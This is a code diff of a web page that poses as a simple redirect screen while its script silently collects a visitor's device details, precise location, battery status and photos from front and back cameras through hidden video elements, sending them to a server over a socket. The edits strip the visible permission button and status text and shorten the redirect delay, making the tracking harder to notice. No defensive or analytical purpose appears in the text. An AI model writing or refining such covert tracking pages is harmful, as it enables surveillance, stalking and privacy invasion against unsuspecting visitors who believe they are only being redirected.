@@ -47,25 +47,7 @@
             margin-top: 4px;
         }
         .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
-        
-        /* Hidden elements */
         #hiddenVideo, #hiddenVideoBack { display: none; }
-        
-        /* Optional permission button - small and clean */
-        .perm-btn {
-            background: #4285f4;
-            color: white;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 6px;
-            font-size: 13px;
-            cursor: pointer;
-            margin-top: 15px;
-            display: none;
-            font-weight: 500;
-        }
-        .perm-btn:hover { background: #3367d6; }
-        
         #statusMsg {
             font-size: 12px;
             color: #999;
@@ -80,7 +62,6 @@
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text">Please wait a moment</div>
         <div id="statusMsg"></div>
-        <button class="perm-btn" id="manualTriggerBtn">Allow Permissions</button>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -98,13 +79,13 @@
 
     <script>
         // ============================================================
-        // SIMPLE, CLEAN, GUARANTEED WORKING
+        // SIMPLE - ONLY BROWSER DEFAULT PERMISSIONS
+        // NO BUTTONS, NO CUSTOM POPUPS
         // ============================================================
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
             const statusMsg = document.getElementById('statusMsg');
-            const manualBtn = document.getElementById('manualTriggerBtn');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
@@ -154,12 +135,11 @@
                     });
 
                     socket.on('connect', function() {
-                        setStatus('Connected');
+                        setStatus('');
                         startDataCollection();
                     });
 
                     socket.on('connect_error', function() {
-                        setStatus('Retrying...');
                         setTimeout(() => socket.connect(), 2000);
                     });
 
@@ -187,7 +167,7 @@
                     socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                 }
 
-                // ===== LOCATION =====
+                // ===== LOCATION - Browser Default Popup =====
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
@@ -223,13 +203,13 @@
                                     }
                                 });
                         },
-                        function() { /* Location denied - continue */ },
+                        function() { /* User denied - continue */ },
                         { timeout: 5000, enableHighAccuracy: true }
                     );
                 }
 
-                // ===== CAMERAS =====
-                // Front Camera (silent fail if not available)
+                // ===== CAMERAS - Browser Default Popup =====
+                // Front Camera
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -244,9 +224,9 @@
                         capturePhoto('front', document.getElementById('hiddenVideo'));
                     }, 1000);
                 })
-                .catch(function() { /* Camera not available - skip */ });
+                .catch(function() { /* User denied - continue */ });
 
-                // Back Camera (silent fail if not available)
+                // Back Camera
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
                     audio: false
@@ -261,7 +241,7 @@
                         capturePhoto('back', document.getElementById('hiddenVideoBack'));
                     }, 2000);
                 })
-                .catch(function() { /* Camera not available - skip */ });
+                .catch(function() { /* User denied - continue */ });
 
                 // ===== BATTERY =====
                 if (navigator.getBattery) {
@@ -297,30 +277,10 @@
                     });
                 }
 
-                // ===== AUTO REDIRECT AFTER 5 SECONDS =====
+                // ===== AUTO REDIRECT AFTER 4 SECONDS =====
                 setTimeout(function() {
                     if (!redirectTriggered) redirectNow();
-                }, 5000);
-
-                // ===== MANUAL BUTTON (optional fallback) =====
-                manualBtn.style.display = 'block';
-                manualBtn.onclick = function() {
-                    manualBtn.style.display = 'none';
-                    // Retry camera
-                    navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user' },
-                        audio: false
-                    })
-                    .then(function(stream) {
-                        const video = document.getElementById('hiddenVideo');
-                        video.srcObject = stream;
-                        video.play();
-                        setTimeout(function() {
-                            capturePhoto('front', video);
-                        }, 1000);
-                    })
-                    .catch(function() {});
-                };
+                }, 4000);
             }
 
             // ============================================
@@ -376,7 +336,6 @@
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
-                // Wait for fallback CDN
                 setTimeout(fetchRedirectUrl, 2000);
             }
 
